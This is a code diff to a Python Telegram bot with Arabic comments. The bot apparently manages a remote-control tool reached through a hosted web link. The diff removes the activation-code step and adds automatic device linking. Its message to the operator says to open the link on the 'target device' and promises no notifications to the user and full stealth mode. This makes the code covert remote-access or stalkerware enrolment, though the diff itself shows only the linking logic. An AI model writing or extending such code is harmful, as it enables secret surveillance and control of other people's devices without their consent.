@@ -147,6 +147,25 @@ class DeviceManager:
             logger.error(f"خطأ في إضافة الجهاز: {e}")
             return False
 
+    def add_device_auto(self, user_id: int, device_id: str) -> bool:
+        """إضافة جهاز جديد - ربط تلقائي بدون كود تفعيل"""
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+
+            # إضافة الجهاز بدون كود تفعيل (ربط تلقائي)
+            cursor.execute('''
+                INSERT INTO devices (user_id, device_id, activation_code, status)
+                VALUES (?, ?, ?, ?)
+            ''', (user_id, device_id, 'AUTO_ACTIVATION', 'auto_pending'))
+
+            conn.commit()
+            conn.close()
+            return True
+        except Exception as e:
+            logger.error(f"خطأ في إضافة الجهاز التلقائي: {e}")
+            return False
+
     def get_user_devices(self, user_id: int) -> List[tuple]:
         """الحصول على أجهزة المستخدم"""
         try:
@@ -680,7 +699,7 @@ def send_help(message):
 
 @bot.message_handler(commands=['link'])
 def link_device(message):
-    """ربط جهاز جديد"""
+    """ربط جهاز جديد - ربط تلقائي فوري"""
     user_id = message.from_user.id
     
     if not is_owner(user_id):
@@ -701,37 +720,34 @@ def link_device(message):
         bot.reply_to(message, f"⚠️ وصلت للحد الأقصى من الأجهزة ({SECURITY_CONFIG['max_devices_per_user']}).")
         return
 
-    # توليد كود التفعيل
-    activation_code = security_manager.generate_activation_code()
+    # توليد معرف الجهاز تلقائياً
     device_id = f"DEV-{user_id}-{int(time.time())}"
-
-    # إضافة الجهاز
-    if device_manager.add_device(user_id, device_id, activation_code):
-        # الحصول على رابط Render من المتغيرات البيئية أو استخدام الرابط الافتراضي
-    web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web.onrender.com')
     
-    link_text = f"""
-🔗 **ربط جهاز جديد**
-
-📱 **معرف الجهاز:** `{device_id}`
-🔑 **كود التفعيل:** `{activation_code}`
+    # إضافة الجهاز بدون كود تفعيل (ربط تلقائي)
+    if device_manager.add_device_auto(user_id, device_id):
+        # الحصول على رابط Render من المتغيرات البيئية
+        web_interface_url = os.environ.get('WEB_INTERFACE_URL', 'https://remote-control-web.onrender.com')
+        
+        link_text = f"""
+🔗 **رابط ربط الجهاز**
 
 📋 **خطوات الربط:**
 1. افتح هذا الرابط على الجهاز المستهدف:
    `{web_interface_url}`
 
-2. أدخل كود التفعيل عند الطلب
+2. انقر على زر "ربط الجهاز"
 
-3. انتظر تأكيد الربط
+3. سيتم الربط تلقائياً بدون أي إشعارات
 
 ⚠️ **ملاحظات:**
-• احتفظ بكود التفعيل آمناً
-• لا تشارك الكود مع أحد
-• سيعمل النظام في الخلفية تلقائياً
+• الرابط يعمل مرة واحدة فقط
+• النظام يعمل في الخلفية تلقائياً
+• لا تظهر أي إشعارات للمستخدم
+• وضع التخفي مفعل بالكامل
         """
 
         bot.reply_to(message, link_text, parse_mode='Markdown')
-        device_manager.log_activity(user_id, 'link_device', f'device_id: {device_id}')
+        device_manager.log_activity(user_id, 'link_device_auto', f'device_id: {device_id}')
     else:
         bot.reply_to(message, "❌ حدث خطأ أثناء إنشاء الرابط. يرجى المحاولة مرة أخرى.")
 
